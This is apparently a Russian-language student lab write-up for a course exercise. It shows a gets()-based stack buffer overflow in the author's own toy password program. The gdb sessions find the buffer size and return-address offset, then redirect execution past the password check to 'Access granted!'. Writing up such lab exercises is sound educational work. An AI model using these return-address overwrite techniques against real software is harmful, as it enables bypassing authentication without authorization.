# Решение задачи 2 по теме Функции:

Для того, чтобы понять размеры буфера, воспользуемся информацией о стеке.

```cpp
(gdb) info stack full
#0  IsPassOk () at task_2.c:24
        Pass = "\000\000\000\000`\335\377\377\377\177\000"
#1  0x00000000004011b3 in main () at task_2.c:11
        PwStatus = 0
(gdb) 

```

При выводе в Pass содержится 11 символов, + зарезервированный для конца строки, всего 12 байт.
Далее, попытаемся обранужить положение адреса возврата:

```cpp
Starting program: /home/ivan/code/EltexAcademyLinuxC/functions/task_2 set args

Breakpoint 1, main () at task_2.c:8
8	{
(gdb) n
10		puts("Enter password:");
(gdb) n
Enter password:
11		PwStatus = IsPassOk();
(gdb) n

Breakpoint 2, IsPassOk () at task_2.c:24
24	{
(gdb) n
26		gets(Pass);
(gdb) n
AAAAAAAAAAAABBBBCCCCDDDD
27		return 0 == strcmp(Pass, "test");
(gdb) n
28	}
(gdb) n
0x0000000044444444 in ?? ()
(gdb) 

```

Введя строку из 12 символов A и чередуя символы алфавита блоками по 4 получаем изменения адреса возврата на 0x44444444. 0x44 - код симола D. Получаем пересечение символов D, находящихся с 21 по 24 байт в строке. Таким образом, наш адрес возврата находится на расстоянии 20 байт от переполняемого буфера.

Чтобы узнать адрес машинной инструкции получаения доступа к системе посмотрим на ассемблерный код функции main:

```cpp
Breakpoint 1, main () at task_2.c:8
8	{
(gdb) n
10		puts("Enter password:");
(gdb) disas
Dump of assembler code for function main:
   0x0000000000401196 <+0>:	endbr64 
   0x000000000040119a <+4>:	push   %rbp
   0x000000000040119b <+5>:	mov    %rsp,%rbp
   0x000000000040119e <+8>:	sub    $0x10,%rsp
=> 0x00000000004011a2 <+12>:	lea    0xe5b(%rip),%rdi        # 0x402004
   0x00000000004011a9 <+19>:	callq  0x401070 <puts@plt>
   0x00000000004011ae <+24>:	callq  0x4011e5 <IsPassOk>
   0x00000000004011b3 <+29>:	mov    %eax,-0x4(%rbp)
   0x00000000004011b6 <+32>:	cmpl   $0x0,-0x4(%rbp)
   0x00000000004011ba <+36>:	jne    0x4011d2 <main+60>
   0x00000000004011bc <+38>:	lea    0xe51(%rip),%rdi        # 0x402014
   0x00000000004011c3 <+45>:	callq  0x401070 <puts@plt>
   0x00000000004011c8 <+50>:	mov    $0x1,%edi
   0x00000000004011cd <+55>:	callq  0x4010a0 <exit@plt>
   0x00000000004011d2 <+60>:	lea    0xe49(%rip),%rdi        # 0x402022 <----- Искомая инструкция
   0x00000000004011d9 <+67>:	callq  0x401070 <puts@plt>
   0x00000000004011de <+72>:	mov    $0x0,%eax
   0x00000000004011e3 <+77>:	leaveq 
   0x00000000004011e4 <+78>:	retq   
End of assembler dump.

```

Также можем узнать значение сохранённого $rbp, чтобы оставить его нетронутым после изменения адресов:

```cpp
Starting program: /home/ivan/code/EltexAcademyLinuxC/functions/task_2 set args

Breakpoint 1, main () at task_2.c:8
8	{
(gdb) n
10		puts("Enter password:");
(gdb) n
Enter password:
11		PwStatus = IsPassOk();
(gdb) n

Breakpoint 2, IsPassOk () at task_2.c:24
24	{
(gdb) n
26		gets(Pass);
(gdb) n
AAAABBBBCCCCDDDDEEEEFFFF
27		return 0 == strcmp(Pass, "test");
(gdb) n
28	}
(gdb) n
0x0000000046464646 in ?? ()
(gdb) x $rbp
0x4545454544444444:	Cannot access memory at address 0x4545454544444444
(gdb) x $rip
0x46464646:	Cannot access memory at address 0x46464646
```

Значение 0x45 и 0x44 соотвестствубт байтам с 13 по 20й. Выясним их значения:

```cpp
Starting program: /home/ivan/code/EltexAcademyLinuxC/functions/task_2 set args

Breakpoint 1, main () at task_2.c:8
8	{
(gdb) n
10		puts("Enter password:");
(gdb) x $rbp
0x7fffffffdc60:	0x00
```

Программа, генерирующая строку для ввода находится в файле input_gen.c.
Сгенерировав строку для ввода получаем следующий результат:

```cpp
Starting program: /home/ivan/code/EltexAcademyLinuxC/functions/task_2 < file.txt

Breakpoint 1, main () at task_2.c:8
8	{
(gdb) n
10		puts("Enter password:");
(gdb) n
Enter password:
11		PwStatus = IsPassOk();
(gdb) n

Breakpoint 2, IsPassOk () at task_2.c:24
24	{
(gdb) n
26		gets(Pass);
(gdb) n
27		return 0 == strcmp(Pass, "test");
(gdb) n
28	}
(gdb) n
main () at task_2.c:17
17			printf("Access granted!\n");
(gdb) n
Access granted!
20		return 0;
(gdb) n
21	}
(gdb) n
__libc_start_main (main=0x401196 <main>, argc=1, argv=0x7fffffffdd68, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fffffffdd58) at ../csu/libc-start.c:342
342	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 29217) exited normally]
```

Не зная пароля, мы смогли принудительно перейти к выполнению нужной нам инструкции, минуя if.

Примечание. Данный код успешно запускается и завершается без ошибок при отладке в gdb. При попытке его запуска в терминале получить доступ к требуемой строке удаётся, но после этого программа завершается с segfault:

```bash
ivan@TravelMate:~/code/EltexAcademyLinuxC/functions$ ./task_2 < file.txt
Enter password:
Access granted!
Segmentation fault (core dumped)
```

Причину этого установить не удалось.

